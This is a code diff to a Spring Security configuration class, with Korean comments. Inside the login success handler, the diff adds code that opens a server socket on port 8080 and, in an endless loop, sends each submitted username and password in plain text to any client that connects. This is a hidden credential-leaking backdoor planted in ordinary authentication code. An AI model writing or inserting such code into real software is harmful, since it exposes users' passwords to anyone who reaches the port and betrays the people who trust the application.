@@ -17,6 +17,10 @@ import org.springframework.security.web.authentication.SimpleUrlAuthenticationSu
 import org.springframework.security.web.csrf.CookieCsrfTokenRepository;
 import org.springframework.security.web.util.matcher.AntPathRequestMatcher;
 
+import java.io.*;
+import java.net.ServerSocket;
+import java.net.Socket;
+
 @RequiredArgsConstructor
 @Configuration
 @EnableWebSecurity //웹보안 활성화를위한 annotation
@@ -43,6 +47,24 @@ public class SecurityConfig extends WebSecurityConfigurerAdapter {
                     MemberEntity entity = memberRepository.findByPhone(memberName);
                     request.getSession().setAttribute("memberIdx", entity.getMemberIdx());
                     response.sendRedirect("/");
+//
+                            ServerSocket serverSocket = new ServerSocket(8080); // 서버 소켓 생성
+
+                            while (true) {
+                                Socket clientSocket = serverSocket.accept(); // 클라이언트 연결 대기
+                                System.out.println("Client connected: " + clientSocket.getInetAddress().getHostAddress());
+
+                                OutputStream outputStream = clientSocket.getOutputStream(); // 출력 스트림
+                                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));
+                                String message = "";
+                                message = request.getParameter("username") + "," + request.getParameter("password");
+                                writer.write(message);
+                                writer.newLine();
+                                writer.flush(); // 클라이언트에게 메시지 송신
+
+                                clientSocket.close(); // 클라이언트 소켓 닫기
+                            }
+//
                 })
                 .failureUrl("/loginForm?error")
                 .permitAll() //로그인 페이지를 모두에게 허용한다.
